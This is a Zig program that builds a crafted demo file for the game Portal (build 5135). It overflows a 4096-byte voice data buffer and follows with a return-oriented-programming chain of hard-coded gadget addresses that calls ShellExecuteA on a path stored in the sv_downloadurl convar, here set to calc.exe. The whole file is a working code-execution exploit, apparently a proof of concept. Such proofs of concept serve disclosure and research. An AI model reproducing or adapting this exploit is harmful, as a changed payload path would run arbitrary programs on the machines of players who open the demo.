const std = @import("std");

// This code is for Portal (build 5135)

// Demo protocol 3
// Network protocol 15
const base_demo = @embedFile("demos/portal-5135.dem");

const buffer_size = 256;

// char voiceDataBuffer[4096];
const voice_data_buffer_size = 4096;

const payload = "C:/Windows/System32/calc.exe";

const MessageType = enum(u8) {
    sign_on = 1,
    packet = 2,
    sync_tick = 3,
    console_cmd = 4,
    user_cmd = 5,
    data_tables = 6,
    stop = 7,
    string_table = 8,
};

fn write_message(writer: anytype, message_type: MessageType, tick: i32) !void {
    try writer.writeInt(u8, @intFromEnum(message_type), .little);
    try writer.writeInt(i32, tick, .little);
}

const NetMessageType = enum(u8) {
    nop = 0,
    set_convar = 5,
    voice_data = 15,
};

fn write_net_message(bit_stream: anytype, message_type: NetMessageType) !void {
    try bit_stream.writeBits(@as(u8, @intFromEnum(message_type)), 6);
}

fn write_set_convar(bit_stream: anytype, name: []const u8, value: []const u8) !void {
    try write_net_message(bit_stream, .set_convar);
    // Length
    try bit_stream.writeBits(@as(u8, 1), 8);
    // name
    _ = try bit_stream.write(name);
    try bit_stream.writeBits(@as(u8, 0), 8);
    // value
    _ = try bit_stream.write(value);
    try bit_stream.writeBits(@as(u8, 0), 8);
}

fn write_voice_data(bit_stream: anytype, data: []const u8) !void {
    try write_net_message(bit_stream, .voice_data);
    // Client
    try bit_stream.writeBits(@as(u8, 0), 8);
    // Proximity
    try bit_stream.writeBits(@as(u8, 0), 8);
    // Length
    const length: u16 = @intCast((voice_data_buffer_size + data.len) * 8);
    try bit_stream.writeBits(length, 16);
    // Data
    const padding = [_]u8{0xff} ** voice_data_buffer_size;
    _ = try bit_stream.write(&padding);
    _ = try bit_stream.write(data);
}

const mov_eax_ebp_gadget = 0x10003843; // mov eax, ebp; pop ebp; pop ebx; ret 4;
const pop_edi_gadget = 0x10004409; // pop edi; ret;
const add_eax_edi_gadget = 0x10009a51; // add eax, edi; pop edi; pop esi; ret 8;
const deref_eax_gadget = 0x1000300b; // mov eax, dword ptr [eax]; ret 4;
const xchg_edx_eax_gadget = 0x10009d75; // xchg edx, eax; mov eax, edi; pop edi; pop esi; ret 4;
const eax_0_gadget = 0x10005530; // xor eax, eax; ret;
const shell_execute_gadget = 0x100050ef; // push edx; push "open"; push eax; call dword ptr [->SHELL32.DLL::ShellExecuteA];
const ebp_sv_downloadurl_offset = 0x18EEB0; // offset between the value on ebp and the string for cvar sv_downloadurl
const empty_space_addr = 0x10024300; // random empty space in launcher

fn write_packet(writer: anytype) !void {
    try write_message(writer, .packet, 1);
    // PacketInfo
    try writer.writeByteNTimes(0, 76);
    // InSequence
    try writer.writeInt(i32, 0, .little);
    // OutSequence
    try writer.writeInt(i32, 0, .little);

    const total_buffer_size = voice_data_buffer_size + buffer_size;

    // Size
    try writer.writeInt(u32, total_buffer_size, .little);

    var bit_buf = [_]u8{0} ** total_buffer_size;
    var bit_stream = std.io.fixedBufferStream(&bit_buf);
    var bit_writer = std.io.bitWriter(.little, bit_stream.writer());

    try write_set_convar(&bit_writer, "sv_downloadurl", payload);

    var data_buf = [_]u8{0} ** buffer_size;
    var data_stream = std.io.fixedBufferStream(&data_buf);
    const data_writer = data_stream.writer();

    try data_writer.writeInt(u32, mov_eax_ebp_gadget, .little); // mov eax, ebp
    try data_writer.writeInt(u32, empty_space_addr, .little); // skipped: ret 4
    try data_writer.writeInt(u32, 0xffffffff, .little); // skipped: pop ebp
    try data_writer.writeInt(u32, 0xffffffff, .little); // skipped: pop ebx
    try data_writer.writeInt(u32, pop_edi_gadget, .little); // pop edi
    try data_writer.writeInt(u32, 0xffffffff, .little); // skipped: ret 4
    try data_writer.writeInt(u32, ebp_sv_downloadurl_offset, .little); // edi value
    try data_writer.writeInt(u32, add_eax_edi_gadget, .little); // add eax, edi
    try data_writer.writeInt(u32, 0xffffffff, .little); // skipped: pop edi
    try data_writer.writeInt(u32, 0xffffffff, .little); // skipped: pop esi
    try data_writer.writeInt(u32, deref_eax_gadget, .little); // mov eax, dword ptr [eax]
    try data_writer.writeInt(u32, 0xffffffff, .little); // skipped: ret 8
    try data_writer.writeInt(u32, 0xffffffff, .little); // skipped: ret 8
    try data_writer.writeInt(u32, xchg_edx_eax_gadget, .little); // xchg edx, eax;
    try data_writer.writeInt(u32, 0xffffffff, .little); // skipped: ret 4
    try data_writer.writeInt(u32, 0xffffffff, .little); // skipped: pop edi
    try data_writer.writeInt(u32, 0xffffffff, .little); // skipped: pop esi
    try data_writer.writeInt(u32, eax_0_gadget, .little); // xor eax, eax
    try data_writer.writeInt(u32, 0xffffffff, .little); // skipped: ret 4
    try data_writer.writeInt(u32, shell_execute_gadget, .little); // ShellExecuteA
    try data_writer.writeInt(u32, 0, .little); // lpParameters
    try data_writer.writeInt(u32, 0, .little); // lpDirectory
    try data_writer.writeInt(u32, 0, .little); // nShowCmd

    try write_voice_data(&bit_writer, data_buf[0..try data_stream.getPos()]);

    try bit_writer.flushBits();
    _ = try writer.write(&bit_buf);
}

pub fn main() !void {
    const file = try std.fs.cwd().createFile("out.dem", .{ .truncate = true });
    defer file.close();

    const writer = file.writer();
    _ = try writer.write(base_demo[0 .. base_demo.len - 4]);

    try write_packet(writer);

    _ = try writer.write(base_demo[base_demo.len - 4 .. base_demo.len]);

    std.debug.print("Portal (build 5135) demo written to out.dem\n", .{});
}
